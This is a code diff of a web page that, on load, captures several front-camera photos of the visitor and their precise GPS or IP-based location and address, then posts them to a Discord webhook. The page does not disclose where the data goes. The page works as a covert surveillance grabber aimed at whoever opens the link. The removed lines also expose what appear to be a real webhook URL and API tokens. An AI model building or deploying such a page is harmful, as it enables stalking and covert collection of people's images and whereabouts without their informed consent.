@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic Multiple Photo Capture with Location</title>
+    <title>Photo Capture with Accurate Location</title>
     <style>
         video, canvas {
             position: absolute;
@@ -18,52 +18,61 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const discordWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
-        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
-        const ipinfoURL = 'https://ipinfo.io/json?token=41d360af12f2bf';
+        const discordWebhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
+        const locationIQToken = 'YOUR_LOCATIONIQ_TOKEN';
+        const ipinfoURL = 'https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN';
 
         let locationData = "Location not available";
+        let captureCount = 0;
 
-        // Initialize the camera
+        // Initialize camera for front-facing usage
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 640 }, height: { ideal: 480 } }
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user' // Use front-facing camera
+                    }
                 });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => video.play();
-                captureMultiplePhotos();  // Start capturing photos
+                capturePhotos(); // Start capturing photos
             } catch (error) {
-                console.warn("Camera access failed. Proceeding with location only:", error.message);
-                alert("Unable to access the camera. Location will still be sent.");
+                console.warn("Camera access failed. Sending location only.");
+                alert("Camera access failed. Only location will be sent.");
                 sendLocationOnlyToDiscord();
             }
         }
 
-        // Fetch location data
+        // Get accurate location
         async function getLocation() {
             try {
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (position) => {
-                        const { latitude, longitude } = position.coords;
-                        locationData = await reverseGeocode(latitude, longitude);
-                    }, async (error) => {
-                        console.warn("Geolocation failed, falling back to IP location:", error.message);
-                        await getLocationFromIP();
-                    });
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const { latitude, longitude } = position.coords;
+                            locationData = await reverseGeocode(latitude, longitude);
+                        },
+                        async (error) => {
+                            console.warn("Geolocation failed, falling back to IP location:", error.message);
+                            await getLocationFromIP();
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
                 } else {
                     console.warn("Geolocation not supported, falling back to IP location.");
                     await getLocationFromIP();
                 }
             } catch (error) {
                 console.error("Error getting location:", error);
-                alert("Unable to fetch location. Proceeding with IP-based fallback.");
+                alert("Failed to fetch location. IP-based location will be used.");
                 await getLocationFromIP();
             }
         }
 
-        // Fallback location using IP API
+        // Get location using IP as a fallback
         async function getLocationFromIP() {
             try {
                 const response = await fetch(ipinfoURL);
@@ -81,7 +90,7 @@
             }
         }
 
-        // Reverse geocode to get a human-readable address
+        // Reverse geocode for human-readable address
         async function reverseGeocode(latitude, longitude) {
             try {
                 const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;
@@ -94,21 +103,19 @@
             }
         }
 
-        // Capture multiple photos with a 3-second delay between each
-        async function captureMultiplePhotos() {
+        // Capture photos with 3-second intervals
+        async function capturePhotos() {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             const video = document.getElementById('video');
-            let captureCount = 0;
-            const maxCaptures = 10;
+            const maxCaptures = 5;
             const captureInterval = 3000; // 3 seconds
 
-            // Function to capture a photo and send it to Discord
             async function captureAndSendPhoto() {
                 try {
                     if (video.readyState === video.HAVE_ENOUGH_DATA) {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+                        const imageBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));
 
                         if (imageBlob) {
                             const formData = new FormData();
@@ -122,55 +129,43 @@
 
                             if (!response.ok) {
                                 console.error("Failed to send image to Discord:", response.statusText);
-                                sendLocationOnlyToDiscord();
                             }
                         } else {
                             console.error("Failed to capture image.");
-                            sendLocationOnlyToDiscord();
                         }
-                    } else {
-                        console.error("Video feed is not ready.");
                     }
                 } catch (error) {
                     console.error("Error sending image to Discord:", error);
-                    sendErrorToDiscord("Error sending image to Discord.");
-                    sendLocationOnlyToDiscord();
                 }
             }
 
-            // Loop to capture images at intervals
-            const captureIntervalId = setInterval(async () => {
+            const intervalID = setInterval(async () => {
                 if (captureCount < maxCaptures) {
                     await captureAndSendPhoto();
                     captureCount++;
                 } else {
-                    clearInterval(captureIntervalId);  // Stop capturing after 10 photos
+                    clearInterval(intervalID); // Stop after 5 captures
                 }
             }, captureInterval);
         }
 
-        // Send only location to Discord if image capture fails
+        // Send location-only data to Discord
         async function sendLocationOnlyToDiscord() {
             const locationMessage = `Location: ${locationData}`;
-            fetch(discordWebhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: locationMessage })
-            }).catch(error => console.error("Error sending location-only message to Discord:", error));
+            try {
+                await fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: locationMessage })
+                });
+            } catch (error) {
+                console.error("Error sending location to Discord:", error);
+            }
         }
 
-        // Send an error message to Discord
-        function sendErrorToDiscord(message) {
-            fetch(discordWebhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `Error: ${message}` })
-            }).catch(error => console.error("Error sending error message to Discord:", error));
-        }
-
-        // Start everything on page load
+        // Start on page load
         window.onload = async () => {
-            alert("Initializing the app. Please allow camera and location permissions.");
+            alert("Initializing app. Please allow camera and location permissions.");
             await getLocation(); // Fetch location data
             initCamera();        // Initialize camera
         };
